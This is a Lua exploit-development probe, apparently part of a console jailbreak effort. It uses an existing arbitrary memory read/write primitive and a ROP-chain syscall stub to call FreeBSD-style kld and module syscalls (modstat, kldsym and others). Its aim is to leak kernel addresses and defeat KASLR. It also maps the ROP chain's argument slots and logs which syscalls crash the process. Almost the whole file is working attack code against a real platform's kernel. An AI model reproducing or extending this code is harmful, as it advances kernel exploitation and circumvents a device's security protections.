-- CRASH_CLASS: MODERATE
-- PROBE 56h2: kldsym/modstat KASLR — skip lethal kldstat(308)
--
-- Context: 56h proved kldstat(308) instantly kills the process (like AIO 661).
-- We never reached the other kld/mod syscalls. This probe tests them
-- in order of least-likely-to-crash first.
--
-- Syscalls to test:
--   modfnext(302) — iterate modules, returns int
--   modfind(303) — find module by name, returns int
--   kldfirstmod(309) — first module in kld, returns int
--   kldnext(304) — iterate kld files, returns int
--   modstat(301) — module info struct (may contain addresses)
--   kldsym(337) — symbol lookup (may contain kernel addresses)
--   kldfind(306) — find kld by name (crashed in earlier probes)

print("=== PROBE 56h2: KLDSYM/MODSTAT KASLR (skip lethal kldstat) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

local name_buf = memory.alloc(0x100)
local out_buf = memory.alloc(0x400)

collectgarbage("stop")

-- ============================================================
-- [B] modfnext(302) — int modfnext(int modid)
-- Returns next module ID, 0 = end. Safe (returns int only).
-- ============================================================
print("")
print("[B] modfnext(302) — iterate modules")
local sc_modfnext = make_syscall(302)
local mod_ids = {}
for _, start_id in ipairs({0, 1, 2, 3, -1}) do
    local ok, ret = pcall(function()
        return sc_modfnext(uint64(start_id))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  modfnext(%d) = %d", start_id, r))
    if r > 0 and start_id == 0 then
        mod_ids[#mod_ids + 1] = r
    end
end

-- Chain from modfnext(0) result
if #mod_ids > 0 then
    local mid = mod_ids[1]
    for i = 1, 20 do
        local ok, ret = pcall(function()
            return sc_modfnext(uint64(mid))
        end)
        local r = -999
        if ok then r = to_num(ret) end
        print(string.format("  modfnext(%d) = %d", mid, r))
        if r <= 0 or r == -999 then break end
        mod_ids[#mod_ids + 1] = r
        mid = r
    end
end
print("  Total modules found: " .. #mod_ids)

-- ============================================================
-- [C] modfind(303) — int modfind(const char *name)
-- Returns module ID. Safe (returns int only).
-- ============================================================
print("")
print("[C] modfind(303) — find module by name")
local sc_modfind = make_syscall(303)

local mod_names = {"kernel", "linuxelf", "linux", "if_lo", "sce_sbl",
    "prison", "vfs", "tmpfs", "nullfs", "devfs"}
for _, mname in ipairs(mod_names) do
    -- Write name string
    for ci = 0, 0x3F do
        local byte = 0
        if ci < #mname then byte = string.byte(mname, ci + 1) end
        safe_wd(name_buf + ci, byte)
    end
    local ok, ret = pcall(function()
        return sc_modfind(uint64(name_buf))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  modfind('%s') = %d", mname, r))
end

-- ============================================================
-- [D] kldfirstmod(309) — int kldfirstmod(int fileid)
-- Returns first module ID in a kld file. Safe (returns int).
-- ============================================================
print("")
print("[D] kldfirstmod(309)")
local sc_kldfirstmod = make_syscall(309)
for _, fid in ipairs({0, 1, 2, 3, -1}) do
    local ok, ret = pcall(function()
        return sc_kldfirstmod(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldfirstmod(%d) = %d", fid, r))
end

-- ============================================================
-- [E] kldnext(304) — int kldnext(int fileid)
-- Iterates kld files. Returns next fileid, 0 = end.
-- ============================================================
print("")
print("[E] kldnext(304) — iterate kld files")
local sc_kldnext = make_syscall(304)
local kld_ids = {}
local fid = 0
for attempt = 1, 15 do
    local ok, ret = pcall(function()
        return sc_kldnext(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldnext(%d) = %d", fid, r))
    if r <= 0 or r == -999 then break end
    kld_ids[#kld_ids + 1] = r
    fid = r
end
print("  Total kld files: " .. #kld_ids)

-- ============================================================
-- [F] modstat(301) — int modstat(int modid, struct module_stat *stat)
-- struct module_stat {
--   int version;          +0x00  (set to sizeof before call)
--   char name[32];        +0x04
--   int refs;             +0x24
--   int id;               +0x28
--   struct module_stat_data { ... }  +0x2C+
-- }
-- May contain kernel addresses in extended fields.
-- ============================================================
print("")
print("[F] modstat(301) — module info (may have kernel addresses)")
local sc_modstat = make_syscall(301)

-- Use module IDs we discovered, plus some guesses
local test_mids = {}
for _, m in ipairs(mod_ids) do test_mids[#test_mids + 1] = m end
if #test_mids == 0 then
    test_mids = {1, 2, 3, 0}
end

for _, mid in ipairs(test_mids) do
    -- Try different struct sizes
    for _, ver in ipairs({0x50, 0x58, 0x60, 0x68, 0x40, 0x30, 0x80, 0x100}) do
        -- Clear buffer
        for i = 0, 0x1FF, 4 do safe_wd(out_buf + i, 0) end
        safe_wd(out_buf, ver)

        local ok, ret = pcall(function()
            return sc_modstat(uint64(mid), uint64(out_buf))
        end)
        local r = -999
        if ok then r = to_num(ret) end

        if r == 0 then
            print(string.format("  *** modstat(%d, ver=0x%X) ret=0", mid, ver))
            -- Read name at +0x04
            local name_str = ""
            for ci = 0, 31 do
                local b = safe_rd(out_buf + 4 + ci)
                if b and b > 0 and b < 128 then
                    name_str = name_str .. string.char(b)
                else
                    break
                end
            end
            if #name_str > 0 then
                print("    name: " .. name_str)
            end
            -- Dump all non-zero qwords
            for off = 0, 0xFF, 8 do
                local val = safe_rq(out_buf + off)
                if val then
                    local vh, vl = get_hi_lo(val)
                    if vh ~= 0 or vl ~= 0 then
                        print(string.format("    +0x%02X: %s", off, hexval(val)))
                        if vh >= 0xFFFF8000 then
                            print("      ^^^ KERNEL POINTER!")
                        end
                    end
                end
            end
            break
        elseif r == -999 then
            print(string.format("  modstat(%d, ver=0x%X) CRASHED", mid, ver))
            break
        end
    end
end

-- ============================================================
-- [G] kldsym(337) — int kldsym(int fileid, int cmd, void *data)
-- cmd=0 = KLDSYM_LOOKUP
-- data = struct kld_sym_lookup {
--   int version;      +0x00 (sizeof = 0x20)
--   char *symname;    +0x08
--   u_long symvalue;  +0x10 *** KERNEL ADDRESS ***
--   size_t symsize;   +0x18
-- }
-- ============================================================
print("")
print("[G] kldsym(337) — kernel symbol lookup")
local sc_kldsym = make_syscall(337)
local sym_buf = memory.alloc(0x40)

local symbols = {"printf", "copyin", "copyout", "malloc", "free",
    "sysent", "trap", "syscall"}

-- Try fileid 0 (kernel) with version 0x20
for _, symname in ipairs(symbols) do
    -- Write name
    for ci = 0, #symname do
        local byte = 0
        if ci < #symname then byte = string.byte(symname, ci + 1) end
        safe_wd(name_buf + ci, byte)
    end

    for _, ver in ipairs({0x20, 0x28, 0x18, 0x30}) do
        -- Clear
        for i = 0, 0x3F, 4 do safe_wd(sym_buf + i, 0) end
        safe_wd(sym_buf, ver)
        safe_wq(sym_buf + 0x08, name_buf)

        local ok, ret = pcall(function()
            return sc_kldsym(uint64(0), uint64(0), uint64(sym_buf))
        end)
        local r = -999
        if ok then r = to_num(ret) end

        if r == 0 then
            local symval = safe_rq(sym_buf + 0x10)
            local symsz = safe_rq(sym_buf + 0x18)
            print(string.format("  *** kldsym('%s', ver=0x%X) ret=0", symname, ver))
            print("    symvalue: " .. hexval(symval))
            print("    symsize:  " .. hexval(symsz))
            local vh, vl = get_hi_lo(symval)
            if vh >= 0xFFFF8000 then
                print("    ^^^ KERNEL ADDRESS! KASLR DEFEATED!")
            end
            break
        elseif r == -999 then
            print(string.format("  kldsym('%s', fid=0, ver=0x%X) CRASHED", symname, ver))
            break
        elseif symname == "printf" then
            print(string.format("  kldsym('%s', fid=0, ver=0x%X) ret=%d", symname, ver, r))
        end
    end
end

-- Also try with kld file IDs we found
if #kld_ids > 0 then
    print("")
    print("  Trying kldsym with discovered kld file IDs:")
    -- Write "printf"
    local sn = "printf"
    for ci = 0, #sn do
        local byte = 0
        if ci < #sn then byte = string.byte(sn, ci + 1) end
        safe_wd(name_buf + ci, byte)
    end
    for _, kid in ipairs(kld_ids) do
        for i = 0, 0x3F, 4 do safe_wd(sym_buf + i, 0) end
        safe_wd(sym_buf, 0x20)
        safe_wq(sym_buf + 0x08, name_buf)
        local ok, ret = pcall(function()
            return sc_kldsym(uint64(kid), uint64(0), uint64(sym_buf))
        end)
        local r = -999
        if ok then r = to_num(ret) end
        if r == 0 then
            local symval = safe_rq(sym_buf + 0x10)
            print(string.format("  *** kldsym('printf', fid=%d) ret=0 symvalue=%s",
                kid, hexval(symval)))
        else
            print(string.format("  kldsym('printf', fid=%d) %s", kid,
                r == -999 and "CRASHED" or ("ret=" .. r)))
        end
    end
end

-- ============================================================
-- [H] ROP chain arg slot verification (from 56g analysis)
-- ============================================================
print("")
print("[H] ROP chain arg slot layout")
local pipe_str = tostring(syscall.pipe)
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if fn_addr_str and rop_addr_str then
    local rop_addr = uint64(rop_addr_str)
    print("  ropchain: " .. hexval(rop_addr))

    -- Read the load-source addresses from the chain
    -- Chain+0x10 = fn_ptr_source address
    local fn_src = safe_rq(rop_addr + 0x10)
    print("  fn_ptr_source slot addr: " .. hexval(fn_src))
    if fn_src then
        print("  fn_ptr_source value:     " .. hexval(safe_rq(fn_src)))
    end

    -- The arg slots should be at fn_ptr_source, +0x10, +0x20, ...
    -- Read them all
    if fn_src then
        local arg_base_h, arg_base_l = get_hi_lo(fn_src)
        print("")
        print("  Arg slot table (fn_ptr_src + N*0x10):")
        local labels = {"fn_ptr", "rax/sysno", "rdi/arg1", "rsi/arg2",
            "rdx/arg3", "rcx/arg4", "r8/arg5", "r9/arg6"}
        for i = 0, 7 do
            local slot_lo = arg_base_l + i * 0x10
            local slot_hi = arg_base_h
            if slot_lo >= 0x100000000 then
                slot_hi = slot_hi + 1
                slot_lo = slot_lo - 0x100000000
            end
            local slot_addr = uint64(string.format("0x%X%08X", slot_hi, slot_lo))
            local val = safe_rq(slot_addr)
            print(string.format("    [%d] %s (%s) = %s",
                i, labels[i + 1] or "?", hexval(slot_addr), hexval(val)))
        end
    end
end

collectgarbage("restart")

print("")
print("=== PROBE 56h2 COMPLETE ===")
